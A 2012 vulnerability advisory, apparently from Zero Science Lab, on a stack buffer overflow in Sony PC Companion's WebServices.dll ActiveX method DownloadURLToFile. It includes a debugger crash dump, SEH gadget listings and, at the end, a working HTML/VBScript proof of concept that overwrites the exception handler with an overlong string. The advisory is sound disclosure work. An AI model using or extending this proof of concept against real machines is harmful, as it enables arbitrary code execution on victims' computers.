@@ -1,0 +1,127 @@
+Sony PC Companion 2.1 (DownloadURLToFile()) Stack-based Unicode Buffer Overload SEH
+
+
+Vendor: Sony Mobile Communications AB
+Product web page: http://www.sonymobile.com
+Affected version: 2.10.115 (Production 27.1, Build 830)
+                  2.10.108 (Production 26.1, Build 818)
+
+Summary: PC Companion is a computer application that acts as a portal
+to Sony Xperia and operator features and applications, such as phone
+software updates, management of contacts and calendar, media management
+with Media Go, and a backup and restore feature for your phone content.
+
+Desc: The vulnerability is caused due to a boundary error in WebServices.dll
+when handling the value assigned to the 'bstrFile' item in the DownloadURLToFile
+function and can be exploited to cause a stack-based buffer overflow via an
+overly long string which may lead to execution of arbitrary code on the
+affected machine.
+
+
+------------------------------------------------------------------------------
+
+STATUS_STACK_BUFFER_OVERRUN encountered
+(1120.16cc): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=001f0000 ecx=00000044 edx=001ee5d4 esi=00000000 edi=00000000
+eip=00000000 esp=001ee558 ebp=001ee5d8 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+00000000 ??              ???
+0:000> !exchain
+001eef24: 00430043
+Invalid exception stack at 00420042
+0:000> d 001eef24
+001eef24  42 00 42 00 43 00 43 00-44 00 44 00 44 00 44 00  B.B.C.C.D.D.D.D.
+001eef34  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.
+001eef44  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.
+001eef54  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.
+001eef64  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.
+001eef74  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.
+001eef84  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.
+001eef94  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.
+0:000>
+
+------------------------------------------------------------------------------
+
+Found pop esi - pop ebp - ret  08 at 0x00040030 [wscript.exe]
+** Unicode compatible **
+** Null byte **
+{PAGE_EXECUTE_READ}
+[SafeSEH: Yes - ASLR : Yes]
+[Fixup: Yes]  - C:\Windows\System32\wscript.exe
+
+--
+
+Found pop esi - pop ebp - ret  0c at 0x0004007E [wscript.exe]
+** Unicode compatible **
+** Null byte **
+{PAGE_EXECUTE_READ}
+[SafeSEH: Yes - ASLR : Yes]
+[Fixup: Yes]  - C:\Windows\System32\wscript.exe
+
+------------------------------------------------------------------------------
+
+
+Tested on: Microsoft Windows 7 Ultimate SP1 (EN) 32bit
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Vendor status:
+
+[09.11.2012] Vulnerability discovered in version 2.10.108 (Production 26.1, Build 818).
+[15.11.2012] Contact with the vendor.
+[16.11.2012] Vendor responds asking more details.
+[18.11.2012] Sent detailed information to the vendor.
+[21.11.2012] Asked vendor for status update.
+[21.11.2012] Vendor is investigating the issue.
+[30.11.2012] Vendor confirms the vulnerability.
+[30.11.2012] Working with the vendor.
+[03.12.2012] Version 2.10.115 (Production 27.1, Build 830) is released, still vulnerable.
+[05.12.2012] Asked vendor for status update.
+[06.12.2012] Vendor investigates, promising to share an update soon.
+[12.12.2012] Asked vendor for scheduled patch release date.
+[17.12.2012] No reply from vendor.
+[18.12.2012] Asked vendor for status update.
+[19.12.2012] No reply from vendor.
+[19.12.2012] Notified the vendor that the advisory will be published on 20th of December.
+[20.12.2012] Vendor promises patch in the first quarter of 2013.
+[20.12.2012] Public security advisory released.
+
+
+Advisory ID: ZSL-2012-5117
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5117.php
+
+http://cwe.mitre.org/data/definitions/121.html
+
+
+09.11.2012
+
+---
+
+
+<html>
+<body>
+<object classid='clsid:0F987E61-9C94-49FA-9B6D-2F99BDEB6CF6' id='overrun' />
+<script language='vbscript'>
+targetFile = "C:\Program Files\Sony\Sony PC Companion\WebServices.dll"
+prototype  = "Sub DownloadURLToFile ( ByVal bstrUrl As String ,  ByVal bstrFile As String )"
+memberName = "DownloadURLToFile"
+progid     = "WebServicesLib.HttpClient"
+argCount   = 2
+
+bstrUrl="defaultV"
+bstrFile=String(758, "A") + "BB" + "CC" + String(4238, "D")
+
+'             ^              ^      ^            ^
+'             |              |      |            |
+'----------- junk --------- nseh - seh ------- junk --------
+
+overrun.DownloadURLToFile bstrUrl, bstrFile
+
+</script>
+</body>
+</html>
